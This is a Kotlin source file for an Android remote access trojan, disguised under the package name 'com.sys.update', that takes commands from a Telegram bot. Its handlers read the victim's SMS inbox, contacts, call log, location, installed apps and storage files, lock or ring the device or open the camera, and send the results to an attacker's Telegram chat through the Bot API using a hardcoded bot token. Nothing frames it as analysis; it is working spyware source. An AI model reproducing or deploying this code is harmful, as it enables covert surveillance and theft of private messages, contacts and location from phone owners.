package com.sys.update

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Environment
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import kotlinx.coroutines.*
import okhttp3.*
import java.util.concurrent.TimeUnit

object CmdHandler {
    private val client = OkHttpClient.Builder()
        .readTimeout(60, TimeUnit.SECONDS).build()

    fun handle(ctx: Context, cmd: String, chatId: String) {
        val token = "7966180213:AAGFqmNDy9b-vNFRAvuBQy6yf3b2U5fIxbI"
        CoroutineScope(Dispatchers.IO).launch {
            val reply = when {
                cmd == "/start"    -> "🟢 DDOS Online.\n\nCommands:\n/info \n/location \n/sms \n/contacts \n/calls \n/apps \n/lock \n/ring \n/files \n/camera"
                cmd == "/info"     -> deviceInfo()
                cmd == "/apps"     -> installedApps(ctx)
                cmd == "/lock"     -> { lockDevice(ctx); "🔒 Locked." }
                cmd == "/ring"     -> { ringDevice(ctx); "🔔 Ringing." }
                cmd == "/location" -> getLocation(ctx)
                cmd == "/sms"      -> readSms(ctx)
                cmd == "/contacts" -> readContacts(ctx)
                cmd == "/calls"    -> readCallLogs(ctx)
                cmd == "/files"    -> listFiles()
                cmd == "/camera"   -> { takePhoto(ctx); "📸 Camera command sent." }
                else               -> "❓ Unknown: $cmd"
            }
            send(token, chatId, reply)
        }
    }

    private fun deviceInfo(): String = """
        📱 *Device Info*
        Model: ${android.os.Build.MODEL}
        Brand: ${android.os.Build.BRAND}
        Android: ${android.os.Build.VERSION.RELEASE}
        SDK: ${android.os.Build.VERSION.SDK_INT}
    """.trimIndent()

    private fun installedApps(ctx: Context): String {
        val pm = ctx.packageManager
        val apps = pm.getInstalledApplications(0)
            .filter { pm.getLaunchIntentForPackage(it.packageName) != null }
            .map { it.packageName }
        return "📦 Apps (${apps.size}):\n" + apps.take(50).joinToString("\n")
    }

    private fun readSms(ctx: Context): String {
        val smsList = mutableListOf<String>()
        val cursor = ctx.contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)
        cursor?.use {
            while (it.moveToNext() && smsList.size < 10) {
                val address = it.getString(it.getColumnIndexOrThrow("address"))
                val body = it.getString(it.getColumnIndexOrThrow("body"))
                smsList.add("📩 $address: $body")
            }
        }
        return if (smsList.isEmpty()) "No SMS found." else "💬 Last 10 SMS:\n" + smsList.joinToString("\n")
    }

    private fun readContacts(ctx: Context): String {
        val contacts = mutableListOf<String>()
        val cursor = ctx.contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
        cursor?.use {
            while (it.moveToNext() && contacts.size < 20) {
                val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val number = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                contacts.add("👤 $name: $number")
            }
        }
        return if (contacts.isEmpty()) "No contacts." else "📇 Contacts:\n" + contacts.joinToString("\n")
    }

    private fun readCallLogs(ctx: Context): String {
        val calls = mutableListOf<String>()
        val cursor = ctx.contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC")
        cursor?.use {
            while (it.moveToNext() && calls.size < 10) {
                val number = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
                val duration = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))
                calls.add("📞 $number (${duration}s)")
            }
        }
        return if (calls.isEmpty()) "No calls." else "📞 Last 10 Calls:\n" + calls.joinToString("\n")
    }

    private fun listFiles(): String {
        val dir = Environment.getExternalStorageDirectory()
        val files = dir.listFiles()?.take(20)?.map { it.name } ?: emptyList()
        return "📁 Files in SD:\n" + files.joinToString("\n")
    }

    private fun takePhoto(ctx: Context) {
        val intent = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        try { ctx.startActivity(intent) } catch (e: Exception) {}
    }

    private fun lockDevice(ctx: Context) {
        val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
        try { dpm.lockNow() } catch (e: Exception) {}
    }

    private fun ringDevice(ctx: Context) {
        val r = android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_RINGTONE)
        val ring = android.media.RingtoneManager.getRingtone(ctx, r)
        ring.play()
    }

    private fun getLocation(ctx: Context): String {
        return try {
            val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
            val loc = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)
                ?: lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
            if (loc != null) "📍 ${loc.latitude}, ${loc.longitude}\nhttps://maps.google.com/?q=${loc.latitude},${loc.longitude}"
            else "❌ No location yet."
        } catch (e: SecurityException) {
            "❌ Location permission not granted."
        }
    }

    private fun send(token: String, chatId: String, text: String) {
        val url = "https://api.telegram.org/bot$token/sendMessage"
        val body = FormBody.Builder()
            .add("chat_id", chatId)
            .add("text", text)
            .build()
        try {
            client.newCall(Request.Builder().url(url).post(body).build()).execute().close()
        } catch (e: Exception) {}
    }
}
